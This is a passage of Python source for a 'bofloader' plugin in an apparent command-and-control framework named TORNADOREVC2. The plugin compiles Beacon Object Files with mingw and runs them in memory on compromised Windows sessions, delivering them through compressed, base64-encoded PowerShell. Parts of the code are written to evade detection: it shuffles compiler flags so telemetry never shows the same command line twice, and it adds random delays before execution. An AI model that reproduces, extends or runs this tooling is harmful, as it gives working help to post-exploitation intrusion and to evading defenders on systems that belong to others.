    if not _save_registry(reg):
        _emit(session, f"{colors['red']}Failed to persist registry{colors['end']}")
        return 1
    _emit(session, f"{colors['green']}Deleted: {name}{colors['end']}")
    _event(session, f"bofloader delete: {name}")
    return 0


def _do_list(session, _opts):
    colors = _colors_of(session)
    reg = _load_registry()
    if not reg:
        _emit(session, f"{colors['yellow']}No BOF commands registered. "
                       f"Use 'run bofloader import <file.cna>'.{colors['end']}")
        return 0
    _emit(session, f"{colors['cyan']}Registered BOF commands ({len(reg)}):{colors['end']}")
    for name in sorted(reg):
        entry = reg[name]
        fmt = entry.get('format') or '-'
        src = entry.get('source', '?')
        exists = '' if os.path.isfile(entry.get('path', '')) else f" {colors['red']}(missing){colors['end']}"
        _emit(session,
              f"  {colors['green']}{name:<20}{colors['end']}  "
              f"fmt={fmt:<8}  {entry.get('path','?')}{exists}")
        if entry.get('desc'):
            _emit(session, f"      {colors['blue']}{entry['desc']}{colors['end']}")
        _emit(session, f"      {colors['blue']}from: {src}{colors['end']}")
    return 0

def _emit_install_hint(session, colors):
    """Print a one-shot install cheatsheet for mingw gcc/g++ per host OS."""
    _emit(session, f"{colors['cyan']}Install a cross-compiler on the operator machine:{colors['end']}")
    _emit(session, "  Debian / Ubuntu :  sudo apt install "
                   "gcc-mingw-w64-x86-64 g++-mingw-w64-x86-64 "
                   "gcc-mingw-w64-i686  g++-mingw-w64-i686")
    _emit(session, "  Fedora          :  sudo dnf install "
                   "mingw64-gcc mingw64-gcc-c++ mingw32-gcc mingw32-gcc-c++")
    _emit(session, "  Arch            :  sudo pacman -S mingw-w64-gcc")
    _emit(session, "  macOS           :  brew install mingw-w64")
    _emit(session, "  Windows (MSYS2) :  pacman -S "
                   "mingw-w64-x86_64-gcc mingw-w64-i686-gcc")
    _emit(session, f"{colors['yellow']}Compilation is optional — executing a "
                   f"pre-built .x64.o / .x86.o works without any compiler.{colors['end']}")

def _do_compile(session, opts):
    colors  = _colors_of(session)
    target  = opts['path']
    archsel = opts.get('arch', 'both')   # 'x64', 'x86', or 'both'

    # ---- resolve source list -------------------------------------------------
    # Accept both C (.c) and C++ (.cpp) sources. Visual Studio project files
    # (.vcxproj*, .sln) and Makefiles are ignored — only the source compiles.
    def _is_source(fname):
        low = fname.lower()
        return low.endswith('.c') or low.endswith('.cpp') or low.endswith('.cc')

    if os.path.isdir(target):
        try:
            sources = sorted(
                os.path.join(target, f)
                for f in os.listdir(target)
                if _is_source(f)
            )
        except OSError as e:
            _emit(session, f"{colors['red']}Cannot read directory: {e}{colors['end']}")
            return 1
        if not sources:
            _emit(session, f"{colors['yellow']}No .c/.cpp files in {target}{colors['end']}")
            return 1
        out_dir  = target
        beacon_h = _find_beacon_header(target)
    elif os.path.isfile(target) and _is_source(os.path.basename(target)):
        sources  = [target]
        out_dir  = os.path.dirname(os.path.abspath(target)) or '.'
        beacon_h = _find_beacon_header(out_dir)
    else:
        _emit(session, f"{colors['red']}Not a .c/.cpp file or directory: {target}{colors['end']}")
        return 1

    # If no beacon.h is found next to the source, write the embedded copy
    # into a per-run temp dir and use it. This means the operator never
    # needs to supply beacon.h separately for the standard Beacon API.
    if beacon_h:
        include_args = ['-I', os.path.dirname(beacon_h)]
    else:
        import tempfile
        try:
            beacon_dir = tempfile.mkdtemp(prefix='tornado_bof_hdr_')
            with open(os.path.join(beacon_dir, 'beacon.h'), 'w',
                      encoding='utf-8') as f:
                f.write(_BEACON_H_C)
            include_args = ['-I', beacon_dir]
            _emit(session,
                  f"{colors['cyan']}Header  : embedded beacon.h "
                  f"({beacon_dir}){colors['end']}")
        except Exception as e:
            _emit(session,
                  f"{colors['yellow']}Warning: could not stage embedded "
                  f"beacon.h ({e}); compilation may fail if the source "
                  f"includes it{colors['end']}")
            include_args = []

    # ---- resolve compilers ---------------------------------------------------
    arch_order = ('x64', 'x86') if archsel == 'both' else (archsel,)
    compilers  = {}          # arch -> (c_compiler_or_None, cxx_compiler_or_None)
    for a in arch_order:
        cc  = _find_mingw_compiler(a, 'c')
        cxx = _find_mingw_compiler(a, 'cxx')
        if cc or cxx:
            compilers[a] = (cc, cxx)
        elif archsel != 'both':
            _emit(session, f"{colors['red']}No mingw compiler for {a} on PATH.{colors['end']}")
            _emit_install_hint(session, colors)
            return 1
        else:
            _emit(session, f"{colors['yellow']}Skipping {a}: no compiler on PATH{colors['end']}")

    if not compilers:
        _emit(session, f"{colors['red']}No mingw compiler available for any target{colors['end']}")
        _emit_install_hint(session, colors)
        return 1

    # ---- flag sets -----------------------------------------------------------
    # Randomize opt level and flag order per invocation so process-creation
    # telemetry doesn't show an identical command line across runs.
    _opt = random.choice(['-Os', '-O2', '-Oz'])
    _base_flags = [
        '-Wall',
        '-DBOF',
        '-ffreestanding',
        '-fno-asynchronous-unwind-tables',
        '-fno-ident',
        '-fno-stack-protector',
        '-fno-builtin',
        '-Wno-unused-parameter',
        '-Wno-unused-function',
    ]
    random.shuffle(_base_flags)
    common_c_flags = ['-c'] + _base_flags + [_opt]
    # C++ gets the same flags plus -fno-exceptions -fno-rtti so the object
    # has no dependency on the C++ runtime (which a raw shell-injected
    # process never has loaded).
    common_cxx_flags = common_c_flags + [
        '-fno-exceptions',
        '-fno-rtti',
        '-fno-use-cxa-atexit',
    ]

    _emit(session, f"{colors['cyan']}Sources : {len(sources)}{colors['end']}")
    for a, (cc, cxx) in compilers.items():
        cc_s  = cc  or '(missing)'
        cxx_s = cxx or '(missing)'
        _emit(session, f"{colors['cyan']}Compiler ({a}) C  : {cc_s}{colors['end']}")
        _emit(session, f"{colors['cyan']}Compiler ({a}) C++: {cxx_s}{colors['end']}")
    if beacon_h:
        _emit(session, f"{colors['cyan']}Header  : {beacon_h}{colors['end']}")

    # ---- compile loop --------------------------------------------------------
    total_ok  = 0
    total_req = 0
    for a, (cc, cxx) in compilers.items():
        mflag  = '-m64' if a == 'x64' else '-m32'
        suffix = '.x64.o' if a == 'x64' else '.x86.o'

        for src in sources:
            is_cxx = src.lower().endswith(('.cpp', '.cc'))
            compiler = cxx if is_cxx else cc

            if compiler is None:
                _emit(session,
                      f"    {colors['yellow']}skipping {os.path.basename(src)} "
                      f"({a}): {'C++' if is_cxx else 'C'} compiler not available{colors['end']}")
                continue

            total_req += 1
            base = os.path.splitext(os.path.basename(src))[0]
            out  = os.path.join(out_dir, base + suffix)

            try:
                if os.path.isfile(out):
                    os.remove(out)
            except OSError:
                pass

            flags = common_cxx_flags if is_cxx else common_c_flags
            cmd = [compiler] + flags + [mflag, '-o', out, src] + include_args
            tag = 'C++' if is_cxx else 'C'
            _emit(session,
                  f"{colors['blue']}  [{a}/{tag}] {os.path.basename(src)} ...{colors['end']}")

            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
            except subprocess.TimeoutExpired:
                _emit(session, f"    {colors['red']}timeout after 180s{colors['end']}")
                continue
            except Exception as e:
                _emit(session, f"    {colors['red']}subprocess error: {e}{colors['end']}")
                continue

            if r.returncode != 0:
                stderr = (r.stderr or r.stdout or 'unknown error').strip()
                errlines = [l for l in stderr.splitlines() if l.strip()][:8]
                _emit(session,
                      f"    {colors['red']}failed (rc={r.returncode}):{colors['end']}")
                for ln in errlines:
                    _emit(session, f"      {ln}")
                continue

            if not os.path.isfile(out):
                _emit(session, f"    {colors['red']}no output produced{colors['end']}")
                continue

            size = os.path.getsize(out)
            try:
                sha = hashlib.sha256(open(out, 'rb').read()).hexdigest()[:12]
            except OSError:
                sha = '?'
            _emit(session,
                  f"    {colors['green']}{os.path.basename(out)} "
                  f"({size} bytes, sha256={sha}){colors['end']}")
            total_ok += 1

            warn = (r.stderr or '').strip()
            if warn:
                for ln in warn.splitlines()[:3]:
                    _emit(session, f"      {colors['yellow']}{ln}{colors['end']}")

    _emit(session,
          f"{colors['green']}Compiled {total_ok}/{total_req} file(s).{colors['end']}")
    _event(session, f"bofloader compile: {target} -> {total_ok}/{total_req}")
    _result(session, 'bofloader', f'{total_ok}/{total_req} compiled',
            f'compile {target}')
    return 0 if total_ok > 0 else 1


# ==========================================================================
# Execute — refactored so it can be called from `run()` and from the
# `bof` handler dispatch with a pre-packed argument blob.
# ==========================================================================

def _execute_bof(session, bof_path, entry, packed, timeout, save_output):
    """Core execution — assumes session is a live SessionContext."""
    colors = _colors_of(session)

    if not os.path.isfile(bof_path):
        _emit(session, f"{colors['red']}BOF not found: {bof_path}{colors['end']}")
        return 1
    try:
        with open(bof_path, 'rb') as f:
            bof_bytes = f.read()
    except Exception as e:
        _emit(session, f"{colors['red']}Failed to read BOF: {e}{colors['end']}")
        return 1

    if len(bof_bytes) < 20:
        _emit(session, f"{colors['red']}File too small to be a COFF object{colors['end']}")
        return 1
    arch = _arch_of(bof_bytes)
    if arch is None:
        machine = struct.unpack('<H', bof_bytes[:2])[0]
        _emit(session, f"{colors['red']}Unsupported COFF machine: 0x{machine:04X} "
                       f"(only AMD64 and I386 are supported){colors['end']}")
        return 1

    if len(bof_bytes) > _MAX_BOF_BYTES:
        _emit(session, f"{colors['yellow']}Warning: BOF is {len(bof_bytes)} bytes; "
                       f"delivery may be slow over this channel{colors['end']}")

    sha = hashlib.sha256(bof_bytes).hexdigest()
    # Raw deflate (wbits=-15) — matches .NET's DeflateStream on the target.
    _co = zlib.compressobj(level=9, wbits=-15)
    bof_gz = _co.compress(bof_bytes) + _co.flush()
    bof_gz_b64 = base64.b64encode(bof_gz).decode('ascii')
    args_b64 = base64.b64encode(packed or b'').decode('ascii')

    time.sleep(random.uniform(0.5, 2.5))

    _event(session, f"bofloader exec: {bof_path} entry={entry} "
                    f"size={len(bof_bytes)} sha256={sha[:16]}")
    _emit(session, f"{colors['cyan']}BOF:    {bof_path} ({len(bof_bytes)} bytes){colors['end']}")
    _emit(session, f"{colors['cyan']}SHA256: {sha[:16]}...{colors['end']}")
    _emit(session, f"{colors['cyan']}Entry:  {entry}{colors['end']}")

    ps, (mark_out, mark_ok, mark_err, mark_end) = _exec_ps(
        bof_gz_b64, args_b64, entry)
    out = _run_ps(session, ps, timeout=timeout, until_marker=mark_end)
    if not out:
        msg = 'no output from target (transport failure or timeout)'
        _emit(session, f"{colors['red']}Failed: {msg}{colors['end']}")
        _result(session, 'bofloader', '', f'{bof_path}: {msg}')
        return 1

    info_lines = _lines_after(out, _MARK_INFO, mark_end)
    if info_lines:
        _event(session, f"bofloader: {info_lines[0]}")

    err_lines = _lines_after(out, mark_err, mark_end)
    if err_lines:
        _emit(session, f"{colors['red']}{err_lines[0]}{colors['end']}")
        _result(session, 'bofloader', '', f'{bof_path}: {err_lines[0]}')
        return 1

    out_lines = _lines_after(out, mark_out, mark_end)
    ok_lines  = _lines_after(out, mark_ok, mark_end)

    if out_lines:
        _emit(session, f"{colors['green']}BOF output:{colors['end']}")
        for line in out_lines:
            _emit(session, f"  {line}")
    if ok_lines:
        _emit(session, f"{colors['green']}{ok_lines[0]}{colors['end']}")

    if save_output:
        try:
            with open(save_output, 'w', encoding='utf-8') as f:
                f.write('\n'.join(out_lines))
                if out_lines:
                    f.write('\n')
            _emit(session, f"{colors['cyan']}Output saved to {save_output}{colors['end']}")
        except Exception as e:
            _emit(session, f"{colors['yellow']}Failed to save output: {e}{colors['end']}")

    _result(session, 'bofloader', '\n'.join(out_lines), f'{bof_path} entry={entry}')
    return 0


# ==========================================================================
# Argument parsing
# ==========================================================================

def _parse_args(args):
    if args is None:
        return 'help', None
    if not isinstance(args, (list, tuple)):
        try:
            args = list(args)
        except TypeError:
            return None, 'invalid arguments'

    if not args:
        return 'help', None
    first = args[0]
    if first in ('-h', '--help', 'help'):
        return 'help', None

    # ---- subcommands that operate on the operator machine ----
    if first == 'import':
        if len(args) < 2:
            return None, 'usage: import <cna_path>'
        p = args[1]
        if not os.path.exists(p):
            return None, f'CNA not found: {p!r}'
        return 'import', {'cna': p}

    if first == 'delete':
        if len(args) < 2:
            return None, 'usage: delete <name>'
        if not _VALID_ENTRY.match(args[1]):
            return None, f'invalid name: {args[1]!r}'
        return 'delete', {'name': args[1]}

    if first in ('list', 'ls'):
        return 'list', {}

    if first == 'compile':
        if len(args) < 2:
            return None, 'usage: compile <dir_or_file.c> [--arch x64|x86|both]'
        arch   = 'both'
        target = None
        i = 1
        while i < len(args):
            a = args[i]
            if a == '--arch' and i + 1 < len(args):
                arch = args[i + 1].lower()
                if arch not in ('x64', 'x86', 'both'):
                    return None, f"invalid arch: {arch!r} (use x64, x86, or both)"
                i += 2
                continue
            if target is None:
                target = a
            i += 1
        if target is None:
            return None, 'usage: compile <dir_or_file.c> [--arch x64|x86|both]'
        return 'compile', {'path': target, 'arch': arch}

    if first in ('--info', 'info'):
        if len(args) < 2:
            return None, 'usage: --info <bof_path>'
        p = args[1]
        if not _VALID_PATH.match(p):
            return None, f'invalid BOF path: {p!r}'
        return 'info', {'path': p}

    # ---- execute: `execute <path> [--entry X] [--timeout N] [-arg V]` ----
    if first in ('execute', 'exec'):
        args = args[1:]

    bof_path = None
    entry    = 'go'
    argument = None
    timeout  = 90.0
    save_out = None

    i = 0
    while i < len(args):
        a = args[i]
        if a == '--entry' and i + 1 < len(args):
            entry = args[i + 1]; i += 2; continue
        if a in ('-arg', '--argument') and i + 1 < len(args):
            argument = args[i + 1]; i += 2; continue
        if a == '--timeout' and i + 1 < len(args):
            try:
                timeout = float(args[i + 1])
            except ValueError:
                return None, f'invalid timeout: {args[i + 1]!r}'
            timeout = max(5.0, min(1800.0, timeout))
            i += 2; continue
        if a == '--save-output' and i + 1 < len(args):
            save_out = args[i + 1]; i += 2; continue
        if bof_path is None:
            bof_path = a
        else:
            return None, f'unexpected extra argument: {a!r}'
        i += 1

    if not bof_path:
        return None, 'missing BOF path'
    if not _VALID_PATH.match(bof_path):
        return None, f'invalid BOF path: {bof_path!r}'
    if not _VALID_ENTRY.match(entry):
        return None, f'invalid entry point: {entry!r}'

    return 'exec', {
        'path': bof_path, 'entry': entry, 'argument': argument,
        'timeout': timeout, 'save_output': save_out,
    }


# ==========================================================================
# Plugin entry point
# ==========================================================================

@plugin.command(
    name='bofloader',
    platforms=['windows'],
    description='Load and execute BOFs in-memory; import/delete/compile CNA scripts',
)
def run(session: SessionContext, args):
    try:
        return _run_impl(session, args)
    except Exception as e:
        try:
            _emit(session, f"[bofloader internal error] {type(e).__name__}: {e}")
        except Exception:
            print(f"[bofloader internal error] {type(e).__name__}: {e}")
        return 1


def _run_impl(session: SessionContext, args):
    colors = _colors_of(session)
    action, opts = _parse_args(args)

    if action == 'help':
        _emit(session, _USAGE)
        return 0
    if action is None:
        _emit(session, f"{colors['red']}{opts}{colors['end']}")
        _emit(session, _USAGE)
        return 1

    # Operator-machine-only subcommands (session may be None)
    if action == 'import':
        return _do_import(session, opts)
    if action == 'delete':
        return _do_delete(session, opts)
    if action == 'list':
        return _do_list(session, opts)
    if action == 'compile':
        return _do_compile(session, opts)

    # --info is local-only
    if action == 'info':
        path = opts['path']
        if not os.path.isfile(path):
            _emit(session, f"{colors['red']}BOF not found: {path}{colors['end']}")
            return 1
        try:
            with open(path, 'rb') as f:
                data = f.read()
        except Exception as e:
            _emit(session, f"{colors['red']}Failed to read BOF: {e}{colors['end']}")
            return 1
        meta = _parse_bof_metadata(data)
        if not meta:
            _emit(session, f"{colors['red']}Not a valid COFF object{colors['end']}")
            return 1
        _print_bof_info(session, colors, path, meta)
        return 0

    # execute requires a live session
    if session is None:
        _emit(None, f"{colors['red']}execute requires a target session"
                    f"{colors['end']}")
        return 1

    bof_path = opts['path']
    entry    = opts['entry']
    argument = opts['argument']
    timeout  = opts['timeout']
    save_out = opts['save_output']

    if argument is not None:
        try:
            packed = _pack_string_arg(argument)
        except Exception as e:
            _emit(session, f"{colors['red']}Argument packing failed: {e}{colors['end']}")
            return 1
    else:
        packed = b''

    return _execute_bof(session, bof_path, entry, packed, timeout, save_out)


# ==========================================================================
# Handler integration — expose `bof <name> [args]` as a top-level command.
# Called from TORNADOREVC2.main_menu and TORNADOREVC2.client_shell_menu.
# ==========================================================================

def dispatch_bof_command(handler, cmd_parts, client_sock=None):
    """
    handler     : the TORNADOREVC2 instance
    cmd_parts   : the split command line, e.g. ['bof', 'netuser', 'CORP\\alice']
    client_sock : the socket when called from inside a session; None otherwise
    """
    colors = handler.colors

    if len(cmd_parts) < 2:
        print(f"{colors['red']}Usage: bof <name> [args...]{colors['end']}")
        _do_list(None, {})
        return True

    # From main menu the first token is the session ID.
    if client_sock is None:
        if cmd_parts[1].isdigit():
            sid = int(cmd_parts[1])
            sock = handler._get_client_by_id(sid)
            if not sock:
                print(f"{colors['red']}Client #{sid} not active{colors['end']}")
                return True
            client_sock = sock
            if len(cmd_parts) < 3:
                print(f"{colors['red']}Usage: bof <ID> <name> [args...]{colors['end']}")
                return True
            cmd_name = cmd_parts[2]
            bof_args = cmd_parts[3:]
        else:
            print(f"{colors['red']}From the main menu: bof <ID> <name> [args...]"
                  f"{colors['end']}")
            return True
    else:
        cmd_name = cmd_parts[1]
        bof_args = cmd_parts[2:]

    reg = _load_registry()
    if cmd_name not in reg:
        print(f"{colors['red']}Unknown BOF command: {cmd_name}{colors['end']}")
        if reg:
            print(f"{colors['yellow']}Registered: "
                  f"{', '.join(sorted(reg.keys()))}{colors['end']}")
        else:
            print(f"{colors['yellow']}No BOFs registered — use "
                  f"'run bofloader import <file.cna>'{colors['end']}")
        return True

    entry = reg[cmd_name]

    bof_path = entry.get('path')
    if not bof_path or not os.path.isfile(bof_path):
        print(f"{colors['red']}BOF file for '{cmd_name}' not found: {bof_path}"
              f"{colors['end']}")
        return True

    fmt = entry.get('format', '') or ''
    if fmt and bof_args:
        try:
            packed = _pack_args_from_format(bof_args, fmt)
        except Exception as e:
            print(f"{colors['red']}Argument error: {e}{colors['end']}")
            print(f"{colors['yellow']}Format string for '{cmd_name}': {fmt!r}"
                  f"{colors['end']}")
            return True
    elif fmt and not bof_args:
        packed = b''
    else:
        # No format declared — pack args as one joined 'z' string if any
        if bof_args:
            try:
                packed = _pack_string_arg(' '.join(bof_args))
            except Exception:
                packed = b''
        else:
            packed = b''

    # Build a SessionContext so we can reuse the plugin's execute path.
    try:
        session = SessionContext(handler, client_sock)
    except Exception as e:
        print(f"{colors['red']}Failed to build session context: {e}{colors['end']}")
        return True

    try:
        _execute_bof(session, bof_path, entry.get('entry', 'go'),
                     packed, entry.get('timeout', 90.0), None)
    except Exception as e:
        print(f"{colors['red']}BOF execution error: {e}{colors['end']}")
    return True